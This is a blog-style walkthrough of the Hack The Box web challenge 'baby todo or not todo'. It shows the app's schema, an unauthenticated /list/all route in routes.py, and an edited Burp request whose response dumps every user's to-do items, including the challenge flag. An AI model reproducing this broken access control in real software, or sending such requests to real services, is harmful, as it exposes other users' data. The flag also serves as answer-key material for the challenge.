---
title: "baby todo or not todo"
date: 2021-10-27T12:49:00-00:00
publishdate: 2021-07-19T18:00:00-00:00
releasedate: 2020-11-19T00:00:00-00:00
draft: false
hideTitle: false
Cover: /images/matrix-map.png
icon: /images/padlock-square.png
toc: true
tags: ["SQL", "Broken API"]
categories: ["Challenge", "Walkthrough", "HTB", "Web"]
description: "I'm so done with these bloody HR solutions coming from those bloody HR specialists, I don't need anyone monitoring my thoughts, or do I... ?"
---

# baby todo or not todo

This challenge is a docker container, coming packaged with a zip of all of the whole docker container (it's a "white box" challenge.)

Open up the source code and read through it, get a sense of how the app is supposed to work. The name of the folder indicates "broken authentication control", so that's probably where this is headed.

## First Take

The db file **schema.sql** is the first file to read. I find it's easiest to get a handle on how an app works if you can see how the data is stored. The schema reveals what we should find once we do open the database. Once the website is running, the flag will be present in the table **todos** (in the **name** field) with assignee = admin

```sql
DROP TABLE IF EXISTS `users`;
DROP TABLE IF EXISTS `todos`;

CREATE TABLE `users` (
	`id` INTEGER PRIMARY KEY AUTOINCREMENT,
	`name` TEXT NOT NULL,
	`secret` TEXT NOT NULL
);

INSERT INTO `users` (`name`, `secret`) VALUES
	('admin', '%s');

CREATE TABLE `todos` (
	`id` INTEGER PRIMARY KEY AUTOINCREMENT,
	`name` TEXT NOT NULL,
	`done` INTEGER NOT NULL,
	`assignee` TEXT NOT NULL
);

INSERT INTO `todos` (`name`, `done`, `assignee`) VALUES
	('HTB{f4k3_fl4g_f0r_t3st1ng}', 0, 'admin');
```

This gives us an idea of what the final step of the challenge might be. 

Even after ready only app.py, it is clear that the app uses session data to identify the user. There is a username, and a secret; the server checks consistency between these and returns the to-do items accordingly. 



## Straight to the Flag

There is one snippet in the source code that, when you read it, you will realize all of that reading was for nothing. Inside **routes.py** there is a hint: 

```python
...
# TODO: There are not view arguments involved, I hope this doesn't break
# the authentication control on the verify_integrity() decorator
@api.route('/list/all/')
def list_all():
	return jsonify(todo.get_all())
...
```

So there is one route that just dumps the database without checking what user requested it? Nice.

I ran the website's docker container, then caught (in Burp) the first request my browser performed. This is a GET that loads all of the current to-do items. It is trivial to change out the endpoint **/list/user12345678** to **/list/all**, while retaining the secret and cookie:

```http
GET /api/list/all/?secret=C038417EFc3A24D HTTP/1.1
Host: 139.59.183.98:32015
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://139.59.183.98:32015/
Connection: close
Cookie: session=eyJhdXRoZW50aWNhdGlvbiI6InVzZXIzMTgzYjgwZCJ9.YWDKPQ.jkmXBByrr67jX8-sD2tEUpRKLzw
```

As described in routes.py, the response is a dump of the whole database. 

```http
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 687
Server: made with <3 by makelarides
Vary: Cookie
Date: Fri, 08 Oct 2021 23:05:54 GMT

[{"assignee":"admin","done":false,"id":1,"name":"how are you seeing this???"},{"assignee":"admin","done":true,"id":2,"name":"give makelaris and jr a kiss <3"},{"assignee":"admin","done":false,"id":3,"name":"do homework"},{"assignee":"admin","done":false,"id":4,"name":"take groceries"},{"assignee":"admin","done":true,"id":5,"name":"world Domination"},{"assignee":"admin","done":false,"id":6,"name":"HTB{l3ss_ch0r3s_m0r3_h4ck1ng...right?!!1}"},{"assignee":"admin","done":false,"id":7,"name":"test"},{"assignee":"user3183b80d","done":false,"id":8,"name":"hack"},{"assignee":"user3183b80d","done":false,"id":9,"name":"eat"},{"assignee":"user3183b80d","done":false,"id":10,"name":"sleep"}]

```

Well how about that; we didn't even need to log in as admin ;)
